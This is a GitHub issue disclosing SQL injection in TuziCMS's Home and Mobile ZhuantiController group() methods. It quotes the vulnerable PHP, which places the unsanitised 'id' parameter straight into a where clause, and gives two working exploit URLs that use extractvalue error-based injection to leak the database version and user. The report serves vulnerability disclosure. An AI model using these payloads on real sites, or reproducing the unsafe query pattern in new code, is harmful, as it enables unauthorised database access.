=== Content from github.com_ae8b4d8b_20250120_233117.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fyeyinshi%2Ftuzicms%2Fissues%2F6)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fyeyinshi%2Ftuzicms%2Fissues%2F6)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=yeyinshi%2Ftuzicms)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[yeyinshi](/yeyinshi)
/
**[tuzicms](/yeyinshi/tuzicms)**
Public

* [Notifications](/login?return_to=%2Fyeyinshi%2Ftuzicms) You must be signed in to change notification settings
* [Fork
  6](/login?return_to=%2Fyeyinshi%2Ftuzicms)
* [Star
   9](/login?return_to=%2Fyeyinshi%2Ftuzicms)

* [Code](/yeyinshi/tuzicms)
* [Issues
  15](/yeyinshi/tuzicms/issues)
* [Pull requests
  0](/yeyinshi/tuzicms/pulls)
* [Actions](/yeyinshi/tuzicms/actions)
* [Projects
  0](/yeyinshi/tuzicms/projects)
* [Wiki](/yeyinshi/tuzicms/wiki)
* [Security](/yeyinshi/tuzicms/security)
* [Insights](/yeyinshi/tuzicms/pulse)

Additional navigation options

* [Code](/yeyinshi/tuzicms)
* [Issues](/yeyinshi/tuzicms/issues)
* [Pull requests](/yeyinshi/tuzicms/pulls)
* [Actions](/yeyinshi/tuzicms/actions)
* [Projects](/yeyinshi/tuzicms/projects)
* [Wiki](/yeyinshi/tuzicms/wiki)
* [Security](/yeyinshi/tuzicms/security)
* [Insights](/yeyinshi/tuzicms/pulse)

# tuzicms SQLinjection #6

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkOpenOpen[tuzicms SQLinjection](#top)#6Copy link![@maoqingya](https://avatars.githubusercontent.com/u/16532700?v=4&size=80)
## Description

![@maoqingya](https://avatars.githubusercontent.com/u/16532700?v=4&size=48)[maoqingya](https://github.com/maoqingya)opened [on Sep 17, 2019](https://github.com/yeyinshi/tuzicms/issues/6#issue-494398070)

**I can't insert image to github~**

**0x01**

App\Home\Controller\ZhuantiController.class.php

`<?php

/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

* [TuziCMS] 兔子CMS
* [@copyright](https://github.com/copyright) (C) 2014-2015 <http://tuzicms.com> All rights reserved.
* @Team Yejiao.net
* [@author](https://github.com/author): 秦大侠 QQ:176881336
* [@Licence](https://github.com/Licence) <http://www.tuzicms.com/license.txt>

  \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\***/

  namespace Home\Controller;

  use Think\Controller;

  use Common\Lib\String; //引入类函数

  use Common\Lib\Category; //引入类函数

  use Common\Lib\Common; //引入类函数

  class ZhuantiController extends CommonController {

  /**
  + 专题页面栏目

    \*/

    public function group(){

    //\*\*字符截取函数

    import('Class.String',APP\_PATH);//文件在当前项目目录下的class目录

    $id=I('get.id');//类别ID

    //dump($id);

    //exit;

    //\*\*获取栏目的下级所有子栏目

    import('Class.Category',APP\_PATH);//文件在当前项目目录下的class目录

    $m=D('Column')->order('column\_sort ASC')->relation(true)->select();

    $m=Category::getChilds($m,$id);//获取id所有的下级栏目的信息

    //二级导航栏目的url，可根据手机站或pc站自动适配url

    $modlu=**ACTION** ;

    strpos($modlu, "wap");

    if (strpos($modlu, "wap")==''){//如果url中不存在wap（不区分大小写）

    //栏目url

    foreach($m as $k3 => $v3){

    $m[$k3]['url'] = **APP**.'/'.$v3['url'].'/'.group.'/'.'id'.'/'.$v3['id'];

    }

    }else {

    //栏目url

    foreach($m as $k3 => $v3){

    $m[$k3]['url'] = **APP**.'/'.'wap'.'/'.$v3['url'].'/'.group.'/'.'id'.'/'.$v3['id'];

    }

    }

    $this->assign('navlist',$m);

    // var\_dump($m);

    // exit;

    //\*\*获取子栏目的上级栏目

    import('Class.Category',APP\_PATH);//文件在当前项目目录下的class目录

    $m=D('Column')->order('column\_sort ASC')->relation(true)->select();

    $m=Category::getParents($m,$id);//获取nv\_id所有的上级栏目的信息

    //全局导航栏目的url，可根据手机站或者pc站石洞适配url

    $modlu=**ACTION** ;

    strpos($modlu, "wap");

    if (strpos($modlu, "wap")==''){//如果url中不存在wap（不区分大小写）

    //栏目url

    foreach($m as $k3 => $v3){

    $m[$k3]['url'] = **APP**.'/'.$v3['url'].'/'.group.'/'.'id'.'/'.$v3['id'];

    }

    }else {

    //栏目url

    foreach($m as $k3 => $v3){

    $m[$k3]['url'] = **APP**.'/'.'wap'.'/'.$v3['url'].'/'.group.'/'.'id'.'/'.$v3['id'];

    }

    }

    //var\_dump($m);

    //exit;

    $this->assign('topnavlist',$m);

    //\*\*全局导航 判断设置最后一个没有尖括号

    $last=count($m)-1;

    $this->assign('last',$last);

    //echo $last;

    //exit;

    //\*\*获取当前栏目的信息

    $topcate=D('Column')->where("id=$id")->order('column\_sort')->relation(true)->select();

    $this->assign('nav\_list',$topcate);

    //dump($topcate);

    //exit;

    if ($topcate==null){

    $this->error('参数错误');

    }

    $this->assign('blist',$topcate);

    //\*\*\*\*SEO信息

    $title=$topcate[0]['column\_name'];

    $m=M('Config');

    $data=$m->field('config\_webname')->find();

    //dump($data);

    //exit;

    $title=$title.' - '.$data['config\_webname'];

    //dump($title);

    //exit;

    $keywords=$topcate[0]['column\_keyw'];

    $description=$topcate[0]['column\_descr'];

    $this->assign('title',$title);

    $this->assign('keywords',$keywords);

    $this->assign('description',$description);

    //dump($title);

    //exit;

    //\*\*获取所有栏目的信息

    import('Class.Category', APP\_PATH);

    $m=D('Column')->order('column\_sort')->relation(true)->select();//查询所有栏目的信息

    //dump($m);

    //exit;

    //\*\*\*\*查询指定id的栏目下的所有子栏目文章

    foreach ($topcate as $k => $v){

    $cids=Category::getChildsId($m, $v['id']);//传递一个父级分类ID返回所有子分类ID

    $cids[]=$v['id'];//将父级id也压进来赋值给$cids

    //dump($cids);

    //exit;

    $where=array('nv\_id'=>array('IN', $cids));//查询新闻表nv\_id字段和$cids相等时的数据

    $topcate[$k]['news']=D('News')->where($where)->where("news\_dell=0")->relation(true)->select();

    $result=$topcate[$k]['news'];

    //查询新闻表下的所有文章 查询新闻数据赋值给字段news

    ```
     //**分页实现代码
     import('ORG.Util.Page');// 导入分页类
     $count=count($result);// 查询满足要求的总记录数
     $Page=new Page($count,5);// 实例化分页类 传入总记录数和每页显示的记录数
     $show=$Page->show();// 分页显示输出
     //**分页实现代码

     //查询数据，实现分页
     $where=array('nv_id'=>array('IN', $cids));//查询新闻表nv_id字段和$cids相等时的数据

     $m=D('News');
     $field='g.id,g.news_content,g.news_title,g.news_pic,g.news_sort';
     $topcate[$k]['news']=$m->alias('g')->join('LEFT JOIN tuzi_attr i ON i.id = g.news_type')->join('LEFT JOIN tuzi_column c ON c.id = g.nv_id')->field($field)->where($where)->where("news_dell=0")->order('news_sort,id desc')->limit($Page->firstRow.','.$Page->listRows)->select();
     $result=$topcate[$k]['news'];
     //查询新闻表下的所有文章   查询新闻数据赋值给字段news

    ```

// dump($result);

// exit;

}

```
	//循环过滤html src标签和截取中文函数  用于摘要简介  substr_ext函数写在commonaction.class.php中
	foreach($result as $k2 => $v2){
		$result[$k2]['news_content'] = $this->substr_ext($v2['news_content'], 0, 160, 'utf-8',"");
	}

	foreach($result as $k2 => $v2){
		$result[$k2]['news_title'] = $this->substr_ext($v2['news_title'], 0, 20, 'utf-8',"");
	}

	//全局导航栏目的url，可根据手机站或者pc站石洞适配url
	$modlu=__ACTION__ ;
	strpos($modlu, "wap");
	if (strpos($modlu, "wap")==''){//如果url中不存在wap（不区分大小写）
		//文章url
		foreach($result as $k3 => $v3){
			$result[$k3]['url'] = __APP__.'/'.MODULE_NAME.'/'.detail.'/'.'id'.'/'.$v3['id'];
		}
	}else {
		//文章url
		foreach($result as $k3 => $v3){
			$result[$k3]['url'] = __APP__.'/'.'wap'.'/'.MODULE_NAME.'/'.detail.'/'.'id'.'/'.$v3['id'];
		}
	}

```

// dump($result);

// exit;

//\*\*分页实现代码

$this->assign('page',$show);// 赋值分页输出

//\*\*分页实现代码

$this->assign('vlist',$result);

//dump($topcate);

//dump($result);

//exit;

```
	$this->display();
}

```

}`

line 21 and line 78

This is a SQLinjection

EXP:

`http://127.0.0.1/tuzicms/index.php/Zhuanti/group?id=1 and (extractvalue(1,concat(0x7e,(select VERSION()),0x7e)))`

**0x02**

App\Mobile\Controller\ZhuantiController.class.php

`<?php

/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

* [TuziCMS] 兔子CMS
* [@copyright](https://github.com/copyright) (C) 2014-2015 <http://tuzicms.com> All rights reserved.
* @Team Yejiao.net
* [@author](https://github.com/author): 秦大侠 QQ:176881336
* [@Licence](https://github.com/Licence) <http://www.tuzicms.com/license.txt>

  \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\***/

  namespace Mobile\Controller;

  use Think\Controller;

  use Common\Lib\String; //引入类函数

  use Common\Lib\Category; //引入类函数

  use Common\Lib\Common; //引入类函数

  class ZhuantiController extends CommonController {

  /**
  + 专题页面栏目

    \*/

    public function group(){

    //\*\*字符截取函数

    import('Class.String',APP\_PATH);//文件在当前项目目录下的class目录

    $id=I('get.id');//类别ID

    //dump($id);

    //exit;

    //\*\*获取栏目的下级所有子栏目

    import('Class.Category',APP\_PATH);//文件在当前项目目录下的class目录

    $m=D('Column')->order('column\_sort ASC')->relation(true)->select();

    $m=Category::getChilds($m,$id);//获取id所有的下级栏目的信息

    //二级导航栏目的url，可根据手机站或pc站自动适配url

    $modlu=**ACTION** ;

    strpos($modlu, "wap");

    if (strpos($modlu, "wap")==''){//如果url中不存在wap（不区分大小写）

    //栏目url

    foreach($m as $k3 => $v3){

    $m[$k3]['url'] = **APP**.'/'.$v3['url'].'/'.group.'/'.'id'.'/'.$v3['id'];

    }

    }else {

    //栏目url

    foreach($m as $k3 => $v3){

    $m[$k3]['url'] = **APP**.'/'.'wap'.'/'.$v3['url'].'/'.group.'/'.'id'.'/'.$v3['id'];

    }

    }

    $this->assign('navlist',$m);

    // var\_dump($m);

    // exit;

    //\*\*获取子栏目的上级栏目

    import('Class.Category',APP\_PATH);//文件在当前项目目录下的class目录

    $m=D('Column')->order('column\_sort ASC')->relation(true)->select();

    $m=Category::getParents($m,$id);//获取nv\_id所有的上级栏目的信息

    //全局导航栏目的url，可根据手机站或者pc站石洞适配url

    $modlu=**ACTION** ;

    strpos($modlu, "wap");

    if (strpos($modlu, "wap")==''){//如果url中不存在wap（不区分大小写）

    //栏目url

    foreach($m as $k3 => $v3){

    $m[$k3]['url'] = **APP**.'/'.$v3['url'].'/'.group.'/'.'id'.'/'.$v3['id'];

    }

    }else {

    //栏目url

    foreach($m as $k3 => $v3){

    $m[$k3]['url'] = **APP**.'/'.'wap'.'/'.$v3['url'].'/'.group.'/'.'id'.'/'.$v3['id'];

    }

    }

    //var\_dump($m);

    //exit;

    $this->assign('topnavlist',$m);

    //\*\*全局导航 判断设置最后一个没有尖括号

    $last=count($m)-1;

    $this->assign('last',$last);

    //echo $last;

    //exit;

    //\*\*获取当前栏目的信息

    $topcate=D('Column')->where("id=$id")->order('column\_sort')->relation(true)->select();

    $this->assign('nav\_list',$topcate);

    //dump($topcate);

    //exit;

    if ($topcate==null){

    $this->error('参数错误');

    }

    $this->assign('blist',$topcate);

    //\*\*\*\*SEO信息

    $title=$topcate[0]['column\_name'];

    $m=M('Config');

    $data=$m->field('config\_webname')->find();

    //dump($data);

    //exit;

    $title=$title.' - '.$data['config\_webname'];

    //dump($title);

    //exit;

    $keywords=$topcate[0]['column\_keyw'];

    $description=$topcate[0]['column\_descr'];

    $this->assign('title',$title);

    $this->assign('keywords',$keywords);

    $this->assign('description',$description);

    //dump($title);

    //exit;

    //\*\*获取所有栏目的信息

    import('Class.Category', APP\_PATH);

    $m=D('Column')->order('column\_sort')->relation(true)->select();//查询所有栏目的信息

    //dump($m);

    //exit;

    //\*\*\*\*查询指定id的栏目下的所有子栏目文章

    foreach ($topcate as $k => $v){

    $cids=Category::getChildsId($m, $v['id']);//传递一个父级分类ID返回所有子分类ID

    $cids[]=$v['id'];//将父级id也压进来赋值给$cids

    //dump($cids);

    //exit;

    $where=array('nv\_id'=>array('IN', $cids));//查询新闻表nv\_id字段和$cids相等时的数据

    $topcate[$k]['news']=D('News')->where($where)->where("news\_dell=0")->relation(true)->select();

    $result=$topcate[$k]['news'];

    //查询新闻表下的所有文章 查询新闻数据赋值给字段news

    ```
     //**分页实现代码
     import('ORG.Util.Page');// 导入分页类
     $count=count($result);// 查询满足要求的总记录数
     $Page=new Page($count,5);// 实例化分页类 传入总记录数和每页显示的记录数
     $show=$Page->show();// 分页显示输出
     //**分页实现代码

     //查询数据，实现分页
     $where=array('nv_id'=>array('IN', $cids));//查询新闻表nv_id字段和$cids相等时的数据

     $m=D('News');
     $field='g.id,g.news_content,g.news_title,g.news_pic,g.news_sort';
     $topcate[$k]['news']=$m->alias('g')->join('LEFT JOIN tuzi_attr i ON i.id = g.news_type')->join('LEFT JOIN tuzi_column c ON c.id = g.nv_id')->field($field)->where($where)->where("news_dell=0")->order('news_sort,id desc')->limit($Page->firstRow.','.$Page->listRows)->select();
     $result=$topcate[$k]['news'];
     //查询新闻表下的所有文章   查询新闻数据赋值给字段news

    ```

// dump($result);

// exit;

}

```
	//循环过滤html src标签和截取中文函数  用于摘要简介  substr_ext函数写在commonaction.class.php中
	foreach($result as $k2 => $v2){
		$result[$k2]['news_content'] = $this->substr_ext($v2['news_content'], 0, 160, 'utf-8',"");
	}

	foreach($result as $k2 => $v2){
		$result[$k2]['news_title'] = $this->substr_ext($v2['news_title'], 0, 20, 'utf-8',"");
	}

	//全局导航栏目的url，可根据手机站或者pc站石洞适配url
	$modlu=__ACTION__ ;
	strpos($modlu, "wap");
	if (strpos($modlu, "wap")==''){//如果url中不存在wap（不区分大小写）
		//文章url
		foreach($result as $k3 => $v3){
			$result[$k3]['url'] = __APP__.'/'.MODULE_NAME.'/'.detail.'/'.'id'.'/'.$v3['id'];
		}
	}else {
		//文章url
		foreach($result as $k3 => $v3){
			$result[$k3]['url'] = __APP__.'/'.'wap'.'/'.MODULE_NAME.'/'.detail.'/'.'id'.'/'.$v3['id'];
		}
	}

```

// dump($result);

// exit;

//\*\*分页实现代码

$this->assign('page',$show);// 赋值分页输出

//\*\*分页实现代码

$this->assign('vlist',$result);

//dump($topcate);

//dump($result);

//exit;

```
	$this->display();
}

```

}`

line 21 and line 78 is a SQLinjection

EXP:

`http://127.0.0.1/tuzicms/index.php/Mobile/Zhuanti/group?id=1%20and%20(extractvalue(1,concat(0x7e,(select%20user()),0x7e)))`

## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


